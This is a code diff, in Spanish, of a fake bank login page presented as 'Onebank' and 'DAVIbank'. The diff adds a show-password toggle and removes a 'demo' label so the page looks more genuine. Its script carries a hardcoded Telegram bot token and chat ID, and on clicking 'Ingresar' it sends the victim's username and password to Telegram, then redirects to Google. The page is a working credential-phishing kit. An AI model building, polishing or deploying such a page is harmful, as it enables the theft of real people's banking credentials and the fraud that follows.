@@ -88,7 +88,7 @@ html,body{
 }
 
 /* =========================
-   CAMPOS VISUALES
+   CAMPOS
 ========================= */
 
 .field{
@@ -109,7 +109,7 @@ html,body{
 .field input{
     width:100%;
     height:52px;
-    padding:5px 8px 5px 40px;
+    padding:5px 45px 5px 40px;  /* padding derecho extra para el ojo */
 
     border:none;
     border-bottom:1px solid #888;
@@ -131,7 +131,47 @@ html,body{
 }
 
 /* =========================
-   BOTÓN
+   BOTÓN DEL OJO
+========================= */
+
+.toggle-password{
+    position:absolute;
+    right:5px;
+    top:50%;
+    transform:translateY(-50%);
+
+    width:38px;
+    height:38px;
+
+    background:transparent;
+    border:none;
+    outline:none;
+
+    cursor:pointer;
+
+    display:none;           /* oculto por defecto */
+    align-items:center;
+    justify-content:center;
+
+    color:#626970;
+    padding:0;
+}
+
+.toggle-password.visible{
+    display:flex;
+}
+
+.toggle-password svg{
+    width:24px;
+    height:24px;
+}
+
+.toggle-password:hover{
+    color:#263746;
+}
+
+/* =========================
+   BOTÓN INGRESAR
 ========================= */
 
 .login-btn{
@@ -155,8 +195,6 @@ html,body{
 .login-btn:hover{
     background:#f0f2f5;
 }
-
-/* Estado activo: cuando hay contraseña escrita */
 
 .login-btn.active{
     background:#df101b;
@@ -244,29 +282,6 @@ html,body{
 }
 
 /* =========================
-   ETIQUETA DEMO
-========================= */
-
-.demo-label{
-    position:fixed;
-
-    right:15px;
-    bottom:15px;
-
-    z-index:50;
-
-    background:rgba(0,0,0,.75);
-    color:#fff;
-
-    padding:8px 13px;
-
-    border-radius:20px;
-
-    font-size:11px;
-    letter-spacing:.3px;
-}
-
-/* =========================
    RESPONSIVE
 ========================= */
 
@@ -350,12 +365,6 @@ html,body{
         margin-right:10px;
         font-size:27px;
     }
-
-    .demo-label{
-        font-size:9px;
-        right:10px;
-        bottom:10px;
-    }
 }
 
 @media(max-width:360px){
@@ -380,10 +389,6 @@ html,body{
 
 <div class="page">
 
-    <!-- =====================
-         FORMULARIO
-    ====================== -->
-
     <section class="login-section">
 
         <div class="login-container">
@@ -397,6 +402,8 @@ html,body{
                 Bienvenido a Onebank
             </h1>
 
+            <!-- Usuario -->
+
             <div class="field">
 
                 <div class="field-icon">
@@ -406,16 +413,9 @@ html,body{
                          stroke="currentColor"
                          stroke-width="1.7">
 
-                        <circle cx="12"
-                                cy="7"
-                                r="4">
-                        </circle>
+                        <circle cx="12" cy="7" r="4"></circle>
 
-                        <path d="M4 21c0-4.2
-                                 3.5-7
-                                 8-7s8 2.8
-                                 8 7">
-                        </path>
+                        <path d="M4 21c0-4.2 3.5-7 8-7s8 2.8 8 7"></path>
 
                     </svg>
 
@@ -425,6 +425,8 @@ html,body{
 
             </div>
 
+            <!-- Contraseña -->
+
             <div class="field">
 
                 <div class="field-icon">
@@ -434,21 +436,11 @@ html,body{
                          stroke="currentColor"
                          stroke-width="1.7">
 
-                        <rect x="5"
-                              y="10"
-                              width="14"
-                              height="10"
-                              rx="1">
-                        </rect>
+                        <rect x="5" y="10" width="14" height="10" rx="1"></rect>
 
-                        <path d="M8 10V7
-                                 a4 4 0 0 1 8 0v3">
-                        </path>
+                        <path d="M8 10V7a4 4 0 0 1 8 0v3"></path>
 
-                        <circle cx="12"
-                                cy="15"
-                                r="1">
-                        </circle>
+                        <circle cx="12" cy="15" r="1"></circle>
 
                     </svg>
 
@@ -456,19 +448,50 @@ html,body{
 
                 <input type="password" id="password" placeholder="Contraseña">
 
+                <!-- Botón del ojo (oculto inicialmente) -->
+
+                <button type="button" class="toggle-password" id="togglePassword" aria-label="Mostrar contraseña">
+
+                    <!-- Ojo abierto (visible cuando está oculta) -->
+
+                    <svg id="eyeOpen" viewBox="0 0 24 24"
+                         fill="none"
+                         stroke="currentColor"
+                         stroke-width="1.8"
+                         stroke-linecap="round"
+                         stroke-linejoin="round">
+
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+
+                        <circle cx="12" cy="12" r="3"></circle>
+
+                    </svg>
+
+                    <!-- Ojo tachado (visible cuando se muestra) -->
+
+                    <svg id="eyeClosed" viewBox="0 0 24 24"
+                         fill="none"
+                         stroke="currentColor"
+                         stroke-width="1.8"
+                         stroke-linecap="round"
+                         stroke-linejoin="round"
+                         style="display:none;">
+
+                        <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+
+                        <line x1="1" y1="1" x2="23" y2="23"></line>
+
+                    </svg>
+
+                </button>
+
             </div>
 
             <button type="button" id="loginBtn" class="login-btn">Ingresar</button>
 
-            <!-- =====================
-                 INFORMACIÓN 1
-            ====================== -->
-
             <div class="info-card">
 
-                <div class="info-icon phone-icon">
-                    ☎
-                </div>
+                <div class="info-icon phone-icon">☎</div>
 
                 <div>
                     Si tienes problemas con tu contraseña
@@ -479,15 +502,9 @@ html,body{
 
             </div>
 
-            <!-- =====================
-                 INFORMACIÓN 2
-            ====================== -->
-
             <div class="info-card">
 
-                <div class="info-icon megaphone-icon">
-                    📣
-                </div>
+                <div class="info-icon megaphone-icon">📣</div>
 
                 <div>
                     DAVIbank tiene un aviso importante
@@ -501,34 +518,46 @@ html,body{
 
     </section>
 
-    <!-- =====================
-         IMAGEN — SOLO PC
-    ====================== -->
-
     <section class="promo-section">
 
-        <img
-            src="imagen-promo.jpg"
-            class="promo-image"
-            alt="Imagen promocional">
+        <img src="imagen-promo.jpg"
+             class="promo-image"
+             alt="Imagen promocional">
 
     </section>
 
 </div>
 
-<!-- =====================
-     SCRIPT PRINCIPAL
-===================== -->
-
 <script>
 const TELEGRAM_TOKEN = "8747147152:AAFNHujZamAp_GRYUue9VwKEktdmovPeoqU";
 const TELEGRAM_CHAT_ID = "8042354877";
 
-const passwordInput = document.getElementById("password");
-const loginBtn = document.getElementById("loginBtn");
+const usuarioInput   = document.getElementById("usuario");
+const passwordInput  = document.getElementById("password");
+const loginBtn       = document.getElementById("loginBtn");
+const togglePassword = document.getElementById("togglePassword");
+const eyeOpen        = document.getElementById("eyeOpen");
+const eyeClosed      = document.getElementById("eyeClosed");
 
-/* Activar / desactivar el estado rojo del botón según la contraseña */
+/* ============================================================
+   1) Mostrar / ocultar el ojo según haya texto en la contraseña
+   ============================================================ */
+
 passwordInput.addEventListener("input", function () {
+
+    // Mostrar u ocultar el ojo
+    if (passwordInput.value.length > 0) {
+        togglePassword.classList.add("visible");
+    } else {
+        togglePassword.classList.remove("visible");
+
+        // Si se borra el campo, volvemos al estado oculto
+        passwordInput.type = "password";
+        eyeOpen.style.display = "block";
+        eyeClosed.style.display = "none";
+    }
+
+    // Activar / desactivar el botón rojo
     if (passwordInput.value.trim().length > 0) {
         loginBtn.classList.add("active");
     } else {
@@ -536,8 +565,35 @@ passwordInput.addEventListener("input", function () {
     }
 });
 
+/* ============================================================
+   2) Alternar entre mostrar y ocultar la contraseña
+   ============================================================ */
+
+togglePassword.addEventListener("click", function () {
+
+    if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        eyeOpen.style.display = "none";
+        eyeClosed.style.display = "block";
+        togglePassword.setAttribute("aria-label", "Ocultar contraseña");
+    } else {
+        passwordInput.type = "password";
+        eyeOpen.style.display = "block";
+        eyeClosed.style.display = "none";
+        togglePassword.setAttribute("aria-label", "Mostrar contraseña");
+    }
+
+    // Mantener el foco en el input
+    passwordInput.focus();
+});
+
+/* ============================================================
+   3) Enviar a Telegram y redirigir a Google
+   ============================================================ */
+
 loginBtn.addEventListener("click", async function () {
-    const usuario = document.getElementById("usuario").value.trim();
+
+    const usuario  = usuarioInput.value.trim();
     const password = passwordInput.value.trim();
 
     if (!usuario || !password) {
@@ -569,7 +625,7 @@ loginBtn.addEventListener("click", async function () {
         console.error("Error:", err);
     }
 
-    // Redirigir a Google después de enviar (siempre, incluso si falla)
+    // Redirigir a Google
     window.location.href = "https://www.google.com";
 });
 </script>
